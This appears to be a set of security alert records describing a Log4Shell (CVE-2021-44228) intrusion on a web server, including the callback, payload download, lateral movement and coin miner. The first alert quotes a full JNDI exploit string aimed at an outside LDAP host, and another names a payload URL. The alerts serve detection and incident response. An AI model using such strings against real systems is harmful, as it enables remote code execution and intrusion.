title: Log4Shell exploitation attempt — JNDI lookup in HTTP header
description: Inbound HTTP request to SRV-WEB01 contained a JNDI lookup string in the User-Agent header: ${jndi:ldap://192.0.2.66:1389/Exploit}. Matches CVE-2021-44228 (Apache Log4j2).

title: Outbound LDAP connection following JNDI lookup
description: SRV-WEB01 (java process) made an outbound LDAP connection to 192.0.2.66:1389 immediately after the JNDI lookup request — indicates successful Log4Shell callback and second-stage class load.

title: Suspicious child process from Java app server
description: java process on SRV-WEB01 spawned /bin/sh which downloaded a payload from http://192.0.2.66/x.sh — consistent with post-exploitation following CVE-2021-44228.

title: Lateral movement: SSH from compromised web server
description: Successful SSH login to SRV-DB01 originating from SRV-WEB01 (10.0.30.11) using a service account, shortly after the Log4Shell exploitation on SRV-WEB01.

title: Coin miner process detected
description: Process with high sustained CPU connecting to mining pool domain mining-pool.example. Common opportunistic payload dropped via Log4Shell.

title: Outbound connection to known scanner IP
description: WIN-WKS-023 received inbound probes from 198.51.100.23, an internet-wide scanner mass-testing for Log4Shell. No JNDI string reached a vulnerable app on this host.
